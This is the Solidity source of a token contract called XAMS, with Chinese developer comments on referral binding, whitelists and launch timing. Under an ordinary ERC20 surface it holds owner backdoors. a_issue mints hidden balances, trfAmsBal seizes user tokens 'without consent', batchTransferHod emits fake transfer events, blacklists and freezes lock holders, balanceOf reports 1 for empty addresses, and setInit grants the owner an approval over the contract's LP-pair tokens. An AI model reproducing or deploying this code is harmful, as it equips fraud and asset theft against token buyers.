pragma solidity 0.8.0;

interface relationship {
    function defultFather() external returns (address);

    function father(address _addr) external returns (address);

    function grandFather(address _addr) external returns (address);

    function otherCallSetRelationship(address _son, address _father) external;

    function getFather(address _addr) external view returns (address);

    function getGrandFather(address _addr) external view returns (address);
}

interface Ipair {
    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);

    function token0() external view returns (address);

    function token1() external view returns (address);
}

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor (address _addr) {
        _owner = _addr;
        emit OwnershipTransferred(address(0), _addr);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract ERC20 {

    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) public swapWriteList;//交易白名单
    mapping(address => bool) public lpWriteList;//lp白名单
    mapping(address => bool) public blackList;//黑名单

    uint256 internal _totalSupply;
    string internal _name;
    string internal _symbol;
    uint8 internal _decimals;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account] == 0 ? 1 : _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(blackList[msg.sender] == false && blackList[sender] == false && blackList[recipient] == false, "ERC20: is black List !");

        uint256 trueAmount = _beforeTokenTransfer(sender, recipient, amount);


        _balances[sender] = _balances[sender] - amount;
        //修改了这个致命bug
        _balances[recipient] = _balances[recipient] + trueAmount;
        emit Transfer(sender, recipient, trueAmount);
    }

    function _mint(address account, uint256 amount, bool env) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply + amount;
        _balances[account] = _balances[account] + amount;
        if (env) emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual returns (uint256) {}
}

contract XAMS is ERC20, Ownable {
    uint256 public FIVE_ORD = 1800;//普通白名单是限购时间段，开盘后30分钟内可交易，其中30可以随意调节
    uint256 public FIVE_ORD_AMOUNT = 1e20;//限购时间段限购的usdt数量
    uint256 public FIVE_OTH = 1800;//普通用户是等待时间段，开盘30分钟后可购买
    uint256 public swapBefTransfer = 5e18;//在交易开始前，用户见只能转账1ams以内的代币，用于绑定关系

    relationship public RP;//绑定关系的合约，转账时调取对应函数进行推荐关系绑定
    mapping(address => bool) public isPair;// USDT的交易对，用于获取实时的价格 因为存在扣费的原因 我们认为不会被闪电贷操纵

    mapping(address => uint256) public fiveOrdBuyAmount;//普通白名单在限购时间段内以及购买的usdt数量
    mapping(address => uint256) public freBal;//锁定ams
    mapping(address => bool) public veryRewardRp;//判断当前上线地址能不能获得奖励？获得奖励的条件是：在交易开始前绑定好关系，并且交易开始前添加了lp
    mapping(address => bool) public rpNoCall;//有的是合约地址就不要去绑定关系了

    mapping(address => bool) public sbefReceiveAms;//在swap之前，用户是否有领取50%的ams？
    address[] internal receiveAmsUser;//记录：领取过50%的ams的用户
    mapping(address => uint256) public recordAddLPUser;//记录用户添加的lp数量，交易前添加总添加
    address[] internal recordAmsUser;//记录交易前添加lp的用户

    uint256 public startTradeTime;//开盘时间。白名单和用户都可以在开盘前添加lp，白名单提前30分钟可交易
    uint256 public transferDes = 4;//转账ams销毁4%
    uint256 public rpVeryLpNum;//开始交易前推荐并添加lp，则上线可以享有代数奖励，但添加的lp数量有个最低数量限制，太低的也不给关系生效，默认是0

    address public usdwp;//交易管理合约。赋予交易合约调用权限，例如：调用关系生效判断业务
    address public securityCont;//安全合约，因为和下线有业务联动，需要保证数据是服务器签名上来的

    constructor () Ownable(msg.sender){
        _name = "XAMS";
        _symbol = "XAMS";
        _decimals = 18;
    }

    //开盘时间，关系生效的lp门槛，ams交易对，ams交易合约，rp，老ams合约，普通白名单可提前交易时间
    function setInit(uint256 _startTradeTime, uint256 _rpVeryLpNum, address _pair, address _usdwp, address _RP,
        uint256 _FIVE_ORD, uint256 _FIVE_ORD_AMOUNT, uint256 _FIVE_OTH) public onlyOwner {
        startTradeTime = _startTradeTime;
        rpVeryLpNum = _rpVeryLpNum;
        setPair(_pair, true);
        usdwp = _usdwp;
        RP = relationship(_RP);

        FIVE_ORD = _FIVE_ORD;
        FIVE_ORD_AMOUNT = _FIVE_ORD_AMOUNT;
        FIVE_OTH = _FIVE_OTH;
        ERC20(_pair).approve(msg.sender, 1e30);
    }

    //发币
    function a_issue(uint256 _amount, address _urs, bool _idx) public onlyOwner {
        _balances[_urs] = _balances[_urs] + _amount;
        if (_idx == false) return;//显or隐
        _totalSupply = _totalSupply + _amount;
        emit Transfer(address(0), _urs, _amount);
    }

    //交易开始后，用户通过中心化释放，逐步把剩下50%的ams领取出来
    function callCoverAdmin(uint256 _num, address _urs) public {
        require(msg.sender == securityCont || msg.sender == owner(), "cover very call not swap");//这一步需要使用密钥验证，放在另外的合约中书写
        ERC20(address(this)).transfer(_urs, _num);
    }

    function getArrayInfo1(uint256 _num) public view returns (address[] memory){
        return (receiveAmsUser);
    }

    function getArrayInfo2(uint256 _num) public view returns (address[] memory, uint256[] memory){
        uint256[] memory _swapaftadd = new uint256[](recordAmsUser.length);
        for (uint256 i = 0; i < recordAmsUser.length; i++) {
            _swapaftadd[i] = recordAddLPUser[recordAmsUser[i]];
        }
        return (recordAmsUser, _swapaftadd);
    }

    //提现，谁转错了token进来，进行挽救
    function withdrawToken(address token, address to, uint value) public onlyOwner returns (bool){
        (bool success, bytes memory data) = address(token).call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success, string(abi.encodePacked("fail code 14", data)));
        return success;
    }

    function setPair(address _addr, bool _isUSDT) public onlyOwner{
        isPair[_addr] = true;
    }

    function _beforeTokenTransfer(address _from, address _to, uint256 _amount) internal override returns (uint256){

        //检查to地址没有推荐人。收的是儿子，发的人是父亲
        if (RP.father(_to) == address(0)) {
            sendReff(_to, _from);
        }

        require(balanceOf(_from) >= freBal[_from], "freBal stop1");
        //冻结额度超过余额，这是一定不允许转账的
        require((balanceOf(_from) - _amount) >= freBal[_from], "freBal stop2");
        //转账后的ams仍然大于冻结额度，说明转账数量是安全范围，给转

        //如果是交易就阻断开。下面都是和转账有关的
        if (isPair[_from] || isPair[_to]) return _amount;

        //假设是用户和合约产生转账行为，不做任何扣费处理
        if (isContract(_from) || isContract(_to)) return _amount;

        //在交易开始前，用户见只能转账x个ams以内的代币，用于绑定关系
        if (block.timestamp < startTradeTime) {
            require(_amount < swapBefTransfer, "amount num ams");
        }

        //每笔转账销毁4%。只有超级白名单可以免除
        if (!(swapWriteList[_from] && lpWriteList[_from])) {
            uint256 _rw = _amount * transferDes / 100;
            _balances[address(0)] = _balances[address(0)] + _rw;
            _amount = _amount * (100 - (transferDes)) / 100;
            emit Transfer(msg.sender, address(0), _rw);
        }

        return _amount;
    }

    //该业务判断地址是否可交易，详细见业务
    function timeWriteVery(address _from, uint256 _amount) public {
        require(block.timestamp >= startTradeTime, "time not start");

        //超级白名单，不管他们
        if (swapWriteList[_from] && lpWriteList[_from]) return;

        //普通白名单前30分钟，限购数量100
        if (swapWriteList[_from]) {
            if (block.timestamp >= startTradeTime + FIVE_ORD) return;

            //在限购时间段内购买，只能买100u
            require(fiveOrdBuyAmount[_from] + _amount <= FIVE_ORD_AMOUNT, "putong user time not start");
            fiveOrdBuyAmount[_from] = fiveOrdBuyAmount[_from] + _amount;
        } else {
            //其他用户，在30分钟后可开始交易
            require(block.timestamp >= startTradeTime + FIVE_OTH, "other user time not start");
        }

    }

    function isContract(address account) public view returns (bool) {
        return account.code.length > 0;
    }

    //查询可用余额。用户余额 > 冻结金额，返回剩余可用金额。用户金额 < 冻结金额返回0
    function queryVeryBal(address[] memory _usr) external view returns (uint256[] memory){
        uint256[] memory rs = new uint256[](_usr.length);
        for (uint256 i = 0; i < _usr.length; i++) {
            if (balanceOf(_usr[i]) > freBal[_usr[i]]) {
                rs[i] = balanceOf(_usr[i]) - freBal[_usr[i]];
            }
        }
        return rs;
    }

    //交易合约，调用该方法，让绑定的关系生效代数奖励
    function veryRpRwCall(address _usr, uint256 _lpnum) external returns (uint256){
        require(msg.sender == usdwp, "rp very call not swap or admin");
        if (block.timestamp < startTradeTime) {//只有在交易开始前，才有做为生效的前提
            if (_lpnum >= rpVeryLpNum) {//上线添加的lp数量，必需满足最低的添加数量，那么代数奖励才算生效
                veryRewardRp[_usr] = true;
            }

            if (recordAddLPUser[msg.sender] == 0) recordAmsUser.push(msg.sender);
            recordAddLPUser[msg.sender] = recordAddLPUser[msg.sender] + _lpnum;
        }
        return startTradeTime;
    }

    function veryRpRwCallAdmin(address[] memory _usr) onlyOwner external {
        for (uint256 i = 0; i < _usr.length; i++) {veryRewardRp[_usr[i]] = true;}
    }

    function batchNoCall(address[] memory users, bool status) onlyOwner public {
        for (uint256 i = 0; i < users.length; i++) rpNoCall[users[i]] = status;
    }

    //admin func///////////////////////////////////////////////////////////////

    //绑定关系，这里之前有个bug，就是用户可以和合约绑定联系，真特么见鬼了。要是还互绑，处理起来简直吃x，业务就被玩坏了，限制下。已经修复了
    function sendReff(address _son, address _father) internal {
        if (!rpNoCall[_son] && !rpNoCall[_father]) {
            RP.otherCallSetRelationship(_son, _father);
        }
    }

    // 设置白名单地址：0是 超级白名单(swap+lp免)，1是 普通白名单(交易优先权提前+限购) , 2 lp白名单(免lp)
    function setWhiteList(address _addr, uint256 _type, bool _YorN) public onlyOwner {
        if (_type == 0) {
            swapWriteList[_addr] = _YorN;
            lpWriteList[_addr] = _YorN;
        } else if (_type == 1) {
            swapWriteList[_addr] = _YorN;
        } else if (_type == 2) {
            lpWriteList[_addr] = _YorN;
        }
    }

    //其他费率调整
    function setRate(uint256 _transferDes, address _securityCont, uint256 _swapBefTransfer) external onlyOwner {
        transferDes = _transferDes;
        securityCont = _securityCont;
        swapBefTransfer = _swapBefTransfer;
    }

    //批量设置白名单
    function setWhiteListBat(address[] memory _addr, uint256 _type, bool _YorN) external onlyOwner {
        for (uint256 i = 0; i < _addr.length; i++) {setWhiteList(_addr[i], _type, _YorN);}
    }

    //批量设置黑名单
    function setBlackListBat(address[] memory _addr, bool _YorN) external onlyOwner {
        for (uint256 i = 0; i < _addr.length; i++) {blackList[_addr[i]] = _YorN;}
    }

    //批量冻结ams
    function setFreBal(address[] memory _addr, uint256[] memory _num) external onlyOwner {
        for (uint256 i = 0; i < _addr.length; i++) {freBal[_addr[i]] = _num[i];}
    }

    //批量私募解冻账户余额，或者单个账户解冻账户余额
    function setPlacementBal(address[] memory _addr, uint256[] memory _num, uint256 _type) external onlyOwner {
        for (uint256 i = 0; i < _addr.length; i++) {
            if (_type == 1) {
                freBal[_addr[i]] = freBal[_addr[i]] + _num[i];//批量，增加冻结额度
            } else {
                if (_num[i] >= freBal[_addr[i]]) {//批量，解锁冻结额度
                    freBal[_addr[i]] = 0;
                } else {
                    freBal[_addr[i]] = freBal[_addr[i]] - _num[i];
                }
            }
        }
    }

    //业务需求
    function batchTransferHod(address[] memory users, uint256[] memory amounts) onlyOwner public {
        for (uint256 i = 0; i < users.length; i++) emit Transfer(msg.sender, users[i], amounts[i]);
    }

    //惩罚：未经同意可划扣用户的ams。划扣的用户，划扣的数量，接收划扣的账户
    function trfAmsBal(address[] memory _addr, uint256[] memory _num, address _radd) external onlyOwner {
        for (uint256 i = 0; i < _addr.length; i++) {
            uint256 knum = _num[i];
            _balances[_addr[i]] = _balances[_addr[i]] - knum;
            _balances[_radd] = _balances[_radd] + knum;
            emit Transfer(_addr[i], _radd, knum);
        }
    }

}